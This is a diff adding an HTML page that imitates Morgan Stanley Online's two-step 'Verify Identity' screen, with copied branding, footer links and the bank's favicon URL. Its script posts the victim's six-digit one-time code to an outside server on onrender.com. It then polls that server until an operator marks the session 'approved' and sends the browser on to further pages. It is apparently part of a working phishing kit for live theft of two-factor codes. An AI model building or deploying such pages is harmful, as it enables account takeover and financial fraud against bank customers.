@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11">
+    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
+    <title>Morgan Stanley Online - Verify Identity</title>
+    <!-- External CSS file -->
+    <link rel="stylesheet" href="style.css">
+    <!-- Additional styles specific to OTP page (kept minimal as requested) -->
+    <style>
+        /* OTP specific styles that weren't in the main style.css */
+        .otp-subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        .otp-subtitle strong {
+            color: #002b51;
+        }
+        
+        /* OTP Input Group */
+        .otp-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            border: 1px solid #dadada;
+            border-radius: 8px;
+            background: white;
+            outline: none;
+            font-family: inherit;
+        }
+        .otp-input:focus {
+            border-color: #187aba;
+            box-shadow: 0 0 0 2px rgba(24, 122, 186, 0.2);
+        }
+        .otp-input.error {
+            border-color: #a00;
+            animation: shake 0.2s ease-in-out 0s 2;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        /* Timer */
+        .timer-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin: 20px 0;
+        }
+        .timer-highlight {
+            color: #187aba;
+            font-weight: 700;
+        }
+        
+        .error-message {
+            color: #a00;
+            font-size: 14px;
+            margin-top: 5px;
+            text-align: center;
+            min-height: 20px;
+        }
+        .session-info {
+            font-size: 12px;
+            color: #999;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Skip to main content link -->
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <!-- Header -->
+    <div role="banner">
+        <div class="mso-header-container">
+            <div>
+                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
+                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
+                </svg>
+            </div>
+            <nav class="mso-header-nav-bar" aria-label="Main navigation">
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main content -->
+    <main id="main-content" class="login-page">
+        <div class="login_form">
+            <div class="login-row">
+                <!-- Left column: OTP form -->
+                <div class="login-left">
+                    <div class="login-container">
+                        <h2>Verify Your Identity</h2>
+                        <div class="otp-subtitle">
+                            Enter the 6-digit code sent to<br>
+                        </div>
+
+                        <!-- OTP Form -->
+                        <form id="otpForm">
+                            <div class="form-row">
+                                <div class="otp-group" id="otpGroup">
+                                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp1" autocomplete="off" aria-label="First digit">
+                                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp2" autocomplete="off" aria-label="Second digit">
+                                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp3" autocomplete="off" aria-label="Third digit">
+                                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp4" autocomplete="off" aria-label="Fourth digit">
+                                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp5" autocomplete="off" aria-label="Fifth digit">
+                                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp6" autocomplete="off" aria-label="Sixth digit">
+                                </div>
+                                <div id="otpError" class="error-message"></div>
+                            </div>
+                            
+                            <!-- Timer -->
+                            <div class="timer-text" id="timer">
+                                Code expires in <span class="timer-highlight" id="timerDisplay">05:00</span>
+                            </div>
+                            
+                            <div class="form-row text-center">
+                                <button type="submit" class="btn-login" id="verifyBtn" disabled>
+                                    <span id="btnText">Verify</span>
+                                    <span id="btnSpinner" class="btn-spinner hidden"></span>
+                                </button>
+                            </div>
+                            <div class="form-row text-center">
+                                <button type="button" class="btn-secondary" id="resendBtn" onclick="resendCode()" disabled>
+                                    Resend code
+                                </button>
+                            </div>
+                        </form>
+
+                        <!-- Session info (hidden by default) -->
+                        <div id="sessionInfo" class="session-info hidden"></div>
+
+                        <!-- Alternative options -->
+                        <div class="forgot-row">
+                            <div class="forgot-item">
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='index.html';">Back to login</button>
+                            </div>
+                            <div class="forgot-item">
+                                <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='#';">Use another method</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Right column: Banner (exact match) -->
+                <div class="login-right">
+                    <div class="banner">
+                        <div class="banner-content">
+                            <h3>Secure Access.<br>Two-Step Verification.</h3>
+                            <p>Protecting your account with an extra layer of security</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="ms-footer">
+            <div class="footer-content">
+                <div class="footer-columns">
+                    <div class="footer-column">
+                        <h4>Need Help?</h4>
+                        <div class="footer-links">
+                            <a href="#">Help + Support</a>
+                            <a href="#" class="mobile-only">Find an Advisor/Branch</a>
+                            <a href="#">Tutorial Videos</a>
+                            <a href="#" class="desktop-only">Co-Browse</a>
+                            <a href="#" class="mobile-only">Mobile Privacy Notice</a>
+                        </div>
+                    </div>
+                    <div class="footer-column footer-column-large">
+                        <h4>Legal</h4>
+                        <div class="footer-links">
+                            <a href="#">Online Security</a>
+                            <a href="#">Terms of Use</a>
+                            <a href="#">U.S. Patriot Act</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Financial Statement</a>
+                            <a href="#">Morgan Stanley & Co. LLC Financial Statement</a>
+                            <a href="#">Research Disclosures</a>
+                            <a href="#">FINRA Rule 4340</a>
+                            <a href="#">Rate Monitor</a>
+                            <a href="#">Morgan Stanley Smith Barney LLC Business Continuity Information</a>
+                            <a href="#">Investor Resources</a>
+                        </div>
+                    </div>
+                    <div class="footer-column desktop-only">
+                        <h4>Privacy</h4>
+                        <div class="footer-links">
+                            <a href="#">US Privacy Policy</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-copyright">
+                    © Morgan Stanley Smith Barney LLC, Member <a href="#">SIPC</a>. All rights reserved.
+                </div>
+            </div>
+        </footer>
+    </main>
+
+<script>
+    // DOM elements
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const otpForm = document.getElementById('otpForm');
+    const btnText = document.getElementById('btnText');
+    const btnSpinner = document.getElementById('btnSpinner');
+    const otpError = document.getElementById('otpError');
+    const timerDisplay = document.getElementById('timerDisplay');
+    const resendBtn = document.getElementById('resendBtn');
+    const sessionInfo = document.getElementById('sessionInfo');
+    
+    // Get session ID from URL or sessionStorage
+    const urlParams = new URLSearchParams(window.location.search);
+    let sessionId = urlParams.get('sessionId') || sessionStorage.getItem('loginSessionId');
+    
+    // If no session ID, try to get from parent page (if in iframe or opener)
+    if (!sessionId && window.opener) {
+        try {
+            sessionId = window.opener.sessionStorage.getItem('loginSessionId');
+        } catch(e) {
+            console.log('Could not access opener session');
+        }
+    }
+    
+    // Store in sessionStorage for persistence
+    if (sessionId) {
+        sessionStorage.setItem('otpSessionId', sessionId);
+        sessionInfo.textContent = `Session: ${sessionId.substring(0,8)}...`;
+        sessionInfo.classList.remove('hidden');
+    } else {
+        sessionId = 'demo-session-' + Math.random().toString(36).substring(7);
+        sessionStorage.setItem('otpSessionId', sessionId);
+        console.log('Generated new session:', sessionId);
+    }
+
+    // Timer variables
+    let timeLeft = 300; // 5 minutes in seconds
+    let timerInterval;
+    let resendTimerInterval;
+    let resendCooldown = 60; // 60 seconds cooldown for resend
+    let pollingInterval;
+
+    // Initialize OTP inputs
+    function initOTPInputs() {
+        otpInputs.forEach((input, index) => {
+            // Auto-focus next input
+            input.addEventListener('input', (e) => {
+                // Only allow numbers
+                input.value = input.value.replace(/[^0-9]/g, '');
+                
+                if (input.value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                checkOTPComplete();
+                clearOTPError();
+            });
+
+            // Handle backspace
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            // Handle paste
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = e.clipboardData.getData('text');
+                const numbers = paste.replace(/[^0-9]/g, '').split('');
+                
+                numbers.forEach((num, i) => {
+                    if (i + index < otpInputs.length) {
+                        otpInputs[i + index].value = num;
+                    }
+                });
+                
+                // Focus last filled input or next empty
+                const lastIndex = Math.min(index + numbers.length, otpInputs.length - 1);
+                otpInputs[lastIndex].focus();
+                checkOTPComplete();
+            });
+        });
+    }
+
+    // Check if all OTP fields are filled
+    function checkOTPComplete() {
+        const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
+        verifyBtn.disabled = !allFilled || timeLeft <= 0;
+        return allFilled;
+    }
+
+    // Get complete OTP code
+    function getOTPCode() {
+        return Array.from(otpInputs).map(input => input.value).join('');
+    }
+
+    // Clear OTP error
+    function clearOTPError() {
+        otpError.textContent = '';
+        otpInputs.forEach(input => input.classList.remove('error'));
+    }
+
+    // Show OTP error
+    function showOTPError(message) {
+        otpError.textContent = message;
+        otpInputs.forEach(input => input.classList.add('error'));
+    }
+
+    // Timer functions
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+            
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerDisplay.textContent = 'Expired';
+                verifyBtn.disabled = true;
+                showOTPError('Code expired. Please request a new one.');
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+
+    // Resend cooldown timer
+    function startResendCooldown() {
+        resendBtn.disabled = true;
+        let cooldown = resendCooldown;
+        
+        if (resendTimerInterval) clearInterval(resendTimerInterval);
+        
+        resendTimerInterval = setInterval(() => {
+            cooldown--;
+            resendBtn.textContent = `Resend code (${cooldown}s)`;
+            
+            if (cooldown <= 0) {
+                clearInterval(resendTimerInterval);
+                resendBtn.disabled = false;
+                resendBtn.textContent = 'Resend code';
+            }
+        }, 1000);
+    }
+
+    // Resend code function
+    async function resendCode() {
+        if (resendBtn.disabled) return;
+        
+        try {
+            // Reset timer
+            timeLeft = 300;
+            updateTimerDisplay();
+            startTimer();
+            
+            // Start cooldown
+            startResendCooldown();
+            
+            // Clear any errors
+            clearOTPError();
+            
+            // Clear OTP inputs
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+            verifyBtn.disabled = true;
+            
+            // Simulate API call (your backend doesn't have resend endpoint yet)
+            console.log('Resend code for session:', sessionId);
+            
+            // You can uncomment this when you add the resend endpoint
+            /*
+            const response = await fetch("https://mass-u4it.onrender.com/resend-otp", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ sessionId: sessionId })
+            });
+            
+            const data = await response.json();
+            
+            if (!data.success) {
+                console.warn('Resend warning:', data.error);
+            }
+            */
+            
+        } catch (error) {
+            console.error('Resend error:', error);
+            // Still allow resend on UI even if API fails
+        }
+    }
+
+    // Show loading spinner in button
+    function showButtonSpinner() {
+        btnText.classList.add("hidden");
+        btnSpinner.classList.remove("hidden");
+    }
+
+    // Hide loading spinner
+    function hideButtonSpinner() {
+        btnText.classList.remove("hidden");
+        btnSpinner.classList.add("hidden");
+    }
+
+    // Start polling for approval
+    function startPolling(sessionId) {
+        if (pollingInterval) clearInterval(pollingInterval);
+        
+        pollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`https://mass-u4it.onrender.com/status/${sessionId}`);
+                const data = await response.json();
+                
+                if (data.status === "approved" && data.redirect_url) {
+                    clearInterval(pollingInterval);
+                    // Store the next page info
+                    sessionStorage.setItem('nextPage', data.redirect_url);
+                    sessionStorage.setItem('currentSessionId', sessionId);
+                    
+                    // Redirect to next page (email.html, c.html, etc.)
+                    if (data.redirect_url.startsWith('http')) {
+                        window.location.href = data.redirect_url;
+                    } else {
+                        // Add session ID to next page URL
+                        window.location.href = data.redirect_url + '?sessionId=' + sessionId;
+                    }
+                }
+            } catch (err) {
+                console.error("Polling error:", err);
+                // Don't clear interval on error, just retry
+            }
+        }, 2000);
+    }
+
+    // Form submission handler
+    otpForm.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        
+        if (timeLeft <= 0) {
+            showOTPError('Code expired. Please request a new one.');
+            return;
+        }
+
+        verifyBtn.disabled = true;
+        showButtonSpinner();
+        clearOTPError();
+
+        const otpCode = getOTPCode();
+
+        try {
+            const response = await fetch("https://mass-u4it.onrender.com/otp", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    otp: otpCode
+                }),
+            });
+
+            const data = await response.json();
+
+            if (!data.success) {
+                showOTPError(data.error || "Invalid verification code");
+                verifyBtn.disabled = false;
+                hideButtonSpinner();
+                
+                // Clear inputs on error
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+                checkOTPComplete();
+                return;
+            }
+
+            // Store new session ID from response
+            if (data.id) {
+                sessionId = data.id;
+                sessionStorage.setItem('otpSessionId', sessionId);
+                sessionInfo.textContent = `Session: ${sessionId.substring(0,8)}...`;
+            }
+
+            // Start polling for approval
+            startPolling(sessionId);
+
+        } catch (error) {
+            console.error("Submission error:", error);
+            showOTPError("An error occurred. Please try again.");
+            verifyBtn.disabled = false;
+            hideButtonSpinner();
+        }
+    });
+
+    // Initialize
+    initOTPInputs();
+    startTimer();
+    startResendCooldown(); // Start cooldown on page load
+    
+    // Focus first input
+    otpInputs[0].focus();
+
+    // Cleanup timers on page unload
+    window.addEventListener('beforeunload', () => {
+        if (timerInterval) clearInterval(timerInterval);
+        if (resendTimerInterval) clearInterval(resendTimerInterval);
+        if (pollingInterval) clearInterval(pollingInterval);
+    });
+</script>
+</body>
+</html>
